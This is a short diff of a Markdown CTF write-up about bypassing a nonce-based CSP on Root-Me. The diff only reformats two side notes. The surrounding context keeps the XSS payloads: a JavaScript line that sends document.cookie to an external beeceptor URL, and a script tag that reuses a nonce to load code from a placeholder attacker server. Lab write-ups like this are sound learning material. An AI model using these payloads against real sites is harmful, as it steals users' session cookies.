@@ -61,7 +61,9 @@ Hmm... odd. Turns out the nonce value changes like every 10 second or smth and t
 
 ![csp-bypass---nonce-4.png](/assets/ctf/root-me/csp-bypass-nonce-4.png)
 
-> **Note**: Make sure to read errors, not like me
+::: info Note
+Make sure to read errors, not like me
+:::
 
 Ok, we can forget about `base` tag for now and just get cookies via script tags.
 
@@ -112,7 +114,9 @@ Accept-Ranges: bytes
 document.location = 'https://uwuos.free.beeceptor.com/?c=' + document.cookie
 ```
 
-> **Note**: Tried searching for a solution which didn't involve using VPS, but nothing. It should be possible to include scripts from services like pastebins, but due to them only using vhost it failed. 
+::: info Note
+Tried searching for a solution which didn't involve using VPS, but nothing. It should be possible to include scripts from services like pastebins, but due to them only using vhost it failed. 
+:::
 
 ```html
 <script nonce=PHNjcmlwdCBubzE0LTMtMjAyNQ== src="http://YOUR_SERVER_IP_IN_DECIMAL/letmein"></script>
